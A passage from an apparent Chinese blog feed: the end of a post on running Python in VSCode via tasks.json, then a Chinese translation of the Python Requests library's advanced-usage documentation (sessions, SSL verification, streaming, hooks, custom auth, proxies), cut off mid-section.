<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/vscode-tasks.json.png" alt="tasks.json"></p>
<p>配置如下</p>
<pre><code>&quot;version&quot;: &quot;0.1.0&quot;,
&quot;command&quot;: &quot;python&quot;,
&quot;isShellCommand&quot;: true,
&quot;args&quot;: [&quot;${file}&quot;],
&quot;showOutput&quot;: &quot;always&quot;
</code></pre><p>然后写完代码后<br><code>Crtl</code>+<code>Shift</code>+<code>B</code>运行Py程序<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/VScode-python-run.png" alt="python-run"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-安装Python插件&quot;&gt;&lt;a href=&quot;#1-安装Python插件&quot; class=&quot;headerlink&quot; title=&quot;1.安装Python插件&quot;&gt;&lt;/a&gt;1.安装Python插件&lt;/h1&gt;&lt;p&gt;在VScode界面按&lt;code&gt;Crtl&lt;/code&gt;+&lt;code&gt;Shift&lt;/code&gt;+&lt;code&gt;P&lt;/code&gt;或者&lt;code&gt;F1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输入&lt;code&gt;ext install&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png&quot; alt=&quot;ext install&quot;&gt;&lt;/p&gt;
&lt;p&gt;直接安装&lt;code&gt;Python&lt;/code&gt;，也就是点击它，然后等待，安装好后会提示你重启&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="VSCode" scheme="http://hacktech.cn/tags/VSCode/"/>
    
  </entry>
  
  <entry>
    <title>Python之Requests的高级用法</title>
    <link href="http://hacktech.cn/2016/06/10/Python%E4%B9%8BRequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
    <id>http://hacktech.cn/2016/06/10/Python之Requests的高级用法/</id>
    <published>2016-06-10T12:38:04.000Z</published>
    <updated>2016-06-10T15:19:37.377Z</updated>
    
    <content type="html"><![CDATA[<hr>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><hr>
<p>本篇文档涵盖了Requests的一些更加高级的特性。</p>
<hr>
<h2 id="会话对象"><a href="#会话对象" class="headerlink" title="会话对象"></a>会话对象</h2><hr>
<p>会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。</p>
<p>会话对象具有主要的Requests API的所有方法。</p>
<p>我们来跨请求保持一些cookies:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span>)</div><div class="line">r = s.get(<span class="string">"http://httpbin.org/cookies"</span>)</div><div class="line"></div><div class="line">print(r.text)</div><div class="line"><span class="comment"># '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;'</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<p>会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = requests.Session()</div><div class="line">s.auth = (<span class="string">'user'</span>, <span class="string">'pass'</span>)</div><div class="line">s.headers.update(&#123;<span class="string">'x-test'</span>: <span class="string">'true'</span>&#125;)</div><div class="line"></div><div class="line"><span class="comment"># both 'x-test' and 'x-test2' are sent</span></div><div class="line">s.get(<span class="string">'http://httpbin.org/headers'</span>, headers=&#123;<span class="string">'x-test2'</span>: <span class="string">'true'</span>&#125;)</div></pre></td></tr></table></figure>
<p>任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。</p>
<blockquote>
<p><strong>从字典参数中移除一个值</strong><br>有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。</p>
</blockquote>
<p>包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#sessionapi" target="_blank" rel="external">会话API文档</a> 。</p>
<hr>
<h2 id="请求与响应对象"><a href="#请求与响应对象" class="headerlink" title="请求与响应对象"></a>请求与响应对象</h2><hr>
<p>任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://en.wikipedia.org/wiki/Monty_Python'</span>)</div></pre></td></tr></table></figure>
<p>如果想访问服务器返回给我们的响应头部信息，可以这样做:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r.headers</div><div class="line">&#123;'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':</div><div class="line">'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':</div><div class="line">'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie',</div><div class="line">'server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT',</div><div class="line">'connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,</div><div class="line">must-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':</div><div class="line">'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,</div><div class="line">MISS from cp1010.eqiad.wmnet:80'&#125;</div></pre></td></tr></table></figure>
<p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</div><div class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</div><div class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/0.13.1'</span>&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><hr>
<p>当你从API调用或Session调用得到一个<a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response" target="_blank" rel="external">Response</a>对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</div><div class="line"></div><div class="line">s = Session()</div><div class="line">req = Request(<span class="string">'GET'</span>, url,</div><div class="line">    data=data,</div><div class="line">    headers=header</div><div class="line">)</div><div class="line">prepped = req.prepare()</div><div class="line"></div><div class="line"><span class="comment"># do something with prepped.body</span></div><div class="line"><span class="comment"># do something with prepped.headers</span></div><div class="line"></div><div class="line">resp = s.send(prepped,</div><div class="line">    stream=stream,</div><div class="line">    verify=verify,</div><div class="line">    proxies=proxies,</div><div class="line">    cert=cert,</div><div class="line">    timeout=timeout</div><div class="line">)</div><div class="line"></div><div class="line">print(resp.status_code)</div></pre></td></tr></table></figure>
<p>因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests.<em> 或 Session.</em>的其他参数来发送它</p>
<p>但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用<em>Session.prepare_request()</em>来替换 <em>Request.prepare()</em>，比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</div><div class="line"></div><div class="line">s = Session()</div><div class="line">req = Request(<span class="string">'GET'</span>,  url,</div><div class="line">    data=data</div><div class="line">    headers=headers</div><div class="line">)</div><div class="line"></div><div class="line">prepped = s.prepare_request(req)</div><div class="line"></div><div class="line"><span class="comment"># do something with prepped.body</span></div><div class="line"><span class="comment"># do something with prepped.headers</span></div><div class="line"></div><div class="line">resp = s.send(prepped,</div><div class="line">    stream=stream,</div><div class="line">    verify=verify,</div><div class="line">    proxies=proxies,</div><div class="line">    cert=cert,</div><div class="line">    timeout=timeout</div><div class="line">)</div><div class="line"></div><div class="line">print(resp.status_code)</div></pre></td></tr></table></figure>
<hr>
<h2 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h2><hr>
<p>Requests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">True</span>)</div><div class="line">requests.exceptions.SSLError: hostname <span class="string">'kennethreitz.com'</span> doesn<span class="string">'t match either of '</span>*.herokuapp.com<span class="string">', '</span>herokuapp.com<span class="string">'</span></div></pre></td></tr></table></figure>
<p>在该域名上我没有设置SSL，所以失败了。但Github设置了SSL:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p>对于私有证书，你也可以传递一个<em>CA_BUNDLE</em>文件的路径给 <strong>verify</strong> 。你也可以设置 <em>REQUEST_CA_BUNDLE</em> 环境变量。</p>
<p>如果你将<strong>verify</strong>设置为<strong>False</strong>，Requests也能<strong>忽略</strong>对SSL证书的验证。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">False</span>)</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p><strong>默认</strong>情况下， <strong>verify</strong> 是设置为<strong>True</strong>的。选项 verify 仅应用于主机证书。</p>
<p>你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=(<span class="string">'/path/server.crt'</span>, <span class="string">'/path/key'</span>))</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p>如果你指定了一个错误路径或一个无效的证书:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=<span class="string">'/wrong_path/server.pem'</span>)</div><div class="line">SSLError: [Errno <span class="number">336265225</span>] _ssl.c:<span class="number">347</span>: error:<span class="number">140</span>B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib</div></pre></td></tr></table></figure>
<hr>
<h2 id="响应体内容工作流"><a href="#响应体内容工作流" class="headerlink" title="响应体内容工作流"></a>响应体内容工作流</h2><hr>
<p>默认情况下，当你进行网络请求后，响应体会<strong>立即</strong>被下载。你可以通过 <strong>stream</strong> 参数覆盖这个行为，<strong>推迟</strong>下载响应体直到访问 <strong>Response.content</strong> 属性:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tarball_url = <span class="string">'https://github.com/kennethreitz/requests/tarball/master'</span></div><div class="line">r = requests.get(tarball_url, stream=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<p>此时仅有响应头被下载下来了，<strong>连接保持打开状态</strong>，因此允许我们根据条件获取内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; TOO_LONG:</div><div class="line">    content = r.content</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>你可以进一步使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_content" target="_blank" rel="external">Response.iter_content</a> 和 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">Response.iter_lines</a> 方法来控制工作流，或者以 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.raw" target="_blank" rel="external">Response.raw</a> 从底层urllib3的 urllib3.HTTPResponse &lt;urllib3.response.HTTPResponse 读取。</p>
<p>如果当你请求时设置<strong>stream</strong>为<strong>True</strong>，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了<strong>Response.close</strong>，这样会使连接变得低效率。如果当你设置 <strong>stream = True</strong> 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用<a href="http://docs.python.org/2/library/contextlib.html#contextlib.closing" target="_blank" rel="external"><strong><em>contextlib.closing</em></strong></a>,比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</div><div class="line"></div><div class="line"><span class="keyword">with</span> closing(requests.get(<span class="string">'http://httpbin.org/get'</span>, stream=<span class="keyword">True</span>)) <span class="keyword">as</span> r:</div><div class="line">    <span class="comment"># Do things with the response here.</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="保持活动状态（持久连接）"><a href="#保持活动状态（持久连接）" class="headerlink" title="保持活动状态（持久连接）"></a>保持活动状态（持久连接）</h2><hr>
<p>好消息 - 归功于urllib3，<strong>同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！</strong></p>
<blockquote>
<p><strong>注意</strong>：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 <strong>stream</strong> 设置为 <strong>False</strong> 或读取 <strong>Response</strong> 对象的 <strong>content</strong> 属性。</p>
</blockquote>
<hr>
<h2 id="流式上传"><a href="#流式上传" class="headerlink" title="流式上传"></a>流式上传</h2><hr>
<p>Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'massive-body'</span>) <span class="keyword">as</span> f:</div><div class="line">    requests.post(<span class="string">'http://some.url/streamed'</span>, data=f)</div></pre></td></tr></table></figure>
<hr>
<h2 id="块编码请求"><a href="#块编码请求" class="headerlink" title="块编码请求"></a>块编码请求</h2><hr>
<p>对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">yield</span> <span class="string">'hi'</span></div><div class="line">    <span class="keyword">yield</span> <span class="string">'there'</span></div><div class="line"></div><div class="line">requests.post(<span class="string">'http://some.url/chunked'</span>, data=gen())</div></pre></td></tr></table></figure>
<hr>
<h2 id="POST-多个编码-Multipart-Encoded-文件"><a href="#POST-多个编码-Multipart-Encoded-文件" class="headerlink" title="POST 多个编码(Multipart-Encoded)文件"></a>POST 多个编码(Multipart-Encoded)文件</h2><hr>
<p>你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”file”</span> <span class="attr">name</span>=<span class="string">”images”</span> <span class="attr">multiple</span>=<span class="string">”true”</span> <span class="attr">required</span>=<span class="string">”true”/</span>&gt;</span></div></pre></td></tr></table></figure>
<p>达到这个目的，仅仅只需要设置文件到一个包含(<em>form_field_name</em>, <em>file_info</em>)的元组的<strong>列表</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>multiple_files = [(<span class="string">'images'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'foo.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>)),</div><div class="line">                      (<span class="string">'images'</span>, (<span class="string">'bar.png'</span>, open(<span class="string">'bar.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>))]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=multiple_files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">'files'</span>: &#123;<span class="string">'images'</span>: <span class="string">'data:image/png;base64,iVBORw ....'</span>&#125;</div><div class="line">  <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a'</span>,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="事件挂钩"><a href="#事件挂钩" class="headerlink" title="事件挂钩"></a>事件挂钩</h2><hr>
<p>Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。</p>
<p>可用的钩子:</p>
<p><em>response:</em></p>
<p>  从一个请求产生的响应</p>
<p>你可以通过传递一个 <em>{hook_name: callback_function}</em> 字典给 hooks 请求参数 为每个请求分配一个钩子函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hooks=dict(response=print_url)</div></pre></td></tr></table></figure>
<p><em>callback_function</em> 会接受一个数据块作为它的第一个参数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_url</span><span class="params">(r)</span>:</span></div><div class="line">    print(r.url)</div></pre></td></tr></table></figure>
<p>若执行你的回调函数期间发生错误，系统会给出一个警告。</p>
<p>若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。</p>
<p>我们来在运行期间打印一些请求方法的参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://httpbin.org'</span>, hooks=dict(response=print_url))</div><div class="line">http://httpbin.org</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<hr>
<h2 id="自定义身份验证"><a href="#自定义身份验证" class="headerlink" title="自定义身份验证"></a>自定义身份验证</h2><hr>
<p>Requests允许你使用自己指定的身份验证机制。</p>
<p>任何传递给请求方法的 <strong><em>auth</em></strong> 参数的可调用对象，在请求发出之前都有机会修改请求。</p>
<p>自定义的身份验证机制是作为 <em>requests.auth.AuthBase</em> 的子类来实现的，也非常容易定义。</p>
<p>Requests在 <em>requests.auth</em> 中提供了两种常见的的身份验证方案： <em>HTTPBasicAuth</em> 和 <em>HTTPDigestAuth</em> 。</p>
<p>假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> AuthBase</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PizzaAuth</span><span class="params">(AuthBase)</span>:</span></div><div class="line">    <span class="string">"""Attaches HTTP Pizza Authentication to the given Request object."""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username)</span>:</span></div><div class="line">        <span class="comment"># setup any auth-related data here</span></div><div class="line">        self.username = username</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, r)</span>:</span></div><div class="line">        <span class="comment"># modify and return the request</span></div><div class="line">        r.headers[<span class="string">'X-Pizza'</span>] = self.username</div><div class="line">        <span class="keyword">return</span> r</div></pre></td></tr></table></figure>
<p>然后就可以使用我们的<strong><em>PizzaAuth</em></strong>来进行网络请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://pizzabin.org/admin'</span>, auth=PizzaAuth(<span class="string">'kenneth'</span>))</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<hr>
<h2 id="流式请求"><a href="#流式请求" class="headerlink" title="流式请求"></a>流式请求</h2><hr>
<p>使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">requests.Response.iter_lines()</a> 你可以很方便地对流式API（例如 <a href="https://dev.twittercom/docs/streaming-api" target="_blank" rel="external">Twitter的流式API</a> ）进行迭代。简单地设置 stream 为 True 便可以使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">iter_lines()</a> 对相应进行迭代:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">r = requests.get(<span class="string">'http://httpbin.org/stream/20'</span>, stream=<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</div><div class="line"></div><div class="line">    <span class="comment"># filter out keep-alive new lines</span></div><div class="line">    <span class="keyword">if</span> line:</div><div class="line">        print(json.loads(line))</div></pre></td></tr></table></figure>
<hr>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><hr>
<p>如果需要使用代理，你可以通过为任意请求方法提供 <strong><em>proxies</em></strong> 参数来配置单个请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">proxies = &#123;</div><div class="line">  <span class="string">"http"</span>: <span class="string">"http://10.10.1.10:3128"</span>,</div><div class="line">  <span class="string">"https"</span>: <span class="string">"http://10.10.1.10:1080"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line">requests.get(<span class="string">"http://example.org"</span>, proxies=proxies)</div></pre></td></tr></table></figure>
<p>你也可以通过环境变量 <em>HTTP_PROXY</em> 和 <em>HTTPS_PROXY</em> 来配置代理。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">export</span> HTTP_PROXY=<span class="string">"http://10.10.1.10:3128"</span></div><div class="line">$ <span class="built_in">export</span> HTTPS_PROXY=<span class="string">"http://10.10.1.10:1080"</span></div><div class="line">$ python</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">"http://example.org"</span>)</div></pre></td></tr></table></figure>
<p>若你的代理需要使用<strong>HTTP Basic Auth</strong>，可以使用 <strong><em><a href="http://user:password@host/" target="_blank" rel="external">http://user:password@host/</a> 语法</em></strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxies = &#123;</div><div class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="合规性"><a href="#合规性" class="headerlink" title="合规性"></a>合规性</h2><hr>
<p>Requests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。</p>
<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。</p>
<p>只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。</p>
<p>在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。<strong>(可结合上一篇安装使用快速上手中的 <em>响应内容</em> 学习)</strong></p>
<hr>
<h2 id="HTTP请求类型-附加例子"><a href="#HTTP请求类型-附加例子" class="headerlink" title="HTTP请求类型(附加例子)"></a>HTTP请求类型(附加例子)</h2><hr>
<p>Requests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了<strong>详细示例</strong>。</p>
<p>我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad'</span>)</div></pre></td></tr></table></figure>
<p>我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做:</p>
